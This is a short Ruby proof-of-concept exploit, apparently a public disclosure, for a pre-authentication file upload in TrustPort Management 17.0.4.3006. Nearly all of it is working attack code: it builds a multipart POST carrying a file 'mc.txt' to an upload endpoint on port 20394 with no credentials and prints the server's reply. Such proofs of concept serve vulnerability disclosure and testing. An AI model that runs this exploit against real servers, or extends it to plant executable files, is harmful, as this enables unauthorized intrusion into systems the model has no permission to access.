#!/usr/bin/env ruby
# TrustPort Management version: 17.0.4.3006
# Pre auth file upload.
require 'rex'
require 'rex/mime'

host = ARGV[0]

def usage 
	puts "[*] #{$0} <host>"
	exit
end

usage if ARGV.size < 1

begin

sock =  Rex::Proto::Http::Client.new(host, 20394, context = {}, ssl = true)

post_data = Rex::MIME::Message.new
post_data.add_part("my content here", 'application/octet-stream', nil, "form-data; name=\"importfile\"; filename=\"mc.txt\"")

res = sock.request_cgi(
	{
		'uri'     => "/get/manage-upload-stations-ip-files.php",
		'version' => '1.0',
		'method'  => 'POST',
		'ctype'   => "multipart/form-data; boundary=#{post_data.bound}",
		'data'    => post_data.to_s,
	})
sock.send_request(res)
recv = sock.read_response()
puts recv.body
rescue => e
puts "[!] #{e} ..."
end
